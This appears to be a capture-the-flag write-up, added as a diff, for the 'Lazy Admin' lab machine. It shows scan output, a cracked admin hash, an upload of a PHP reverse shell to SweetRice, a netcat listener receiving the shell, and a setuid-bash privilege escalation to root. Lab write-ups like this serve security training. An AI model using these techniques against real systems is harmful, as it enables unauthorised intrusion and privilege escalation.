@@ -1,0 +1,117 @@
+Lazy Admin is a simple boot2root machine.
+IP: 10.10.107.183 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=38361%PV=Y%DS=2%DC=T%G=Y%TM=5F8551
+OS:E0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
+OS:11NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.107.183 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Oct 13 12:35:45 2020
+URL_BASE: http://10.10.107.183/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.107.183/ ----
+==> DIRECTORY: http://10.10.107.183/content/                                                                                                                                                                   
++ http://10.10.107.183/index.html (CODE:200|SIZE:11321)                                                                                                                                                        
++ http://10.10.107.183/server-status (CODE:403|SIZE:278) 
+
+Got this under /inc/mysql_backup
+
+"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
+
+admin:manager
+passwd:42f749ade7f9e195bf475f37a44cafcb
+
+passwd after cracking:Password123
+
+https://www.exploit-db.com/exploits/40716
+
+Read this exploit for sweetrice.
+You can find the username and password at https://www.exploit-db.com/exploits/40718
+
+Go the media center followed by upload method.
+Upload shell.php5 containing php malicious code and go to /attachment/shell.php5 to get reverse shell.
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.107.183 48782
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 10:30:14 up 27 min,  0 users,  load average: 0.00, 0.02, 0.25
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+
+www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
+cat mysql_login.txt
+rice:randompass
+www-data@THM-Chal:/home/itguy$ 
+
+www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
+sudo /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/etc$ cd /home
+ccd /home
+www-data@THM-Chal:/home$ d itguy
+cd itguy
+www-data@THM-Chal:/home/itguy$ cd backup.pl
+cd backup.pl
+bash: cd: backup.pl: Not a directory
+www-data@THM-Chal:/home/itguy$ cat backup.pl
+cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+www-data@THM-Chal:/home/itguy$ cd /tmp
+cd /tmp
+www-data@THM-Chal:/tmp$ ls -la
+ls -la
+total 1124
+drwxrwxrwt  9 root root    4096 Oct 13 10:42 .
+drwxr-xr-x 23 root root    4096 Nov 29  2019 ..
+drwxrwxrwt  2 root root    4096 Oct 13 10:03 .ICE-unix
+drwxrwxrwt  2 root root    4096 Oct 13 10:03 .Test-unix
+-r--r--r--  1 root root      11 Oct 13 10:05 .X0-lock
+drwxrwxrwt  2 root root    4096 Oct 13 10:05 .X11-unix
+drwxrwxrwt  2 root root    4096 Oct 13 10:03 .XIM-unix
+drwxrwxrwt  2 root root    4096 Oct 13 10:03 .font-unix
+-rwsr-xr-x  1 root root 1109564 Oct 13 10:42 bash
+drwx------  3 root root    4096 Oct 13 10:06 systemd-private-47108b29559d4882a294b24b9115b9f6-colord.service-dIujbN
+drwx------  3 root root    4096 Oct 13 10:05 systemd-private-47108b29559d4882a294b24b9115b9f6-rtkit-daemon.service-KfDjSh
+www-data@THM-Chal:/tmp$ ./bash -p
+./bash -p
+bash-4.3# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+bash-4.3# 
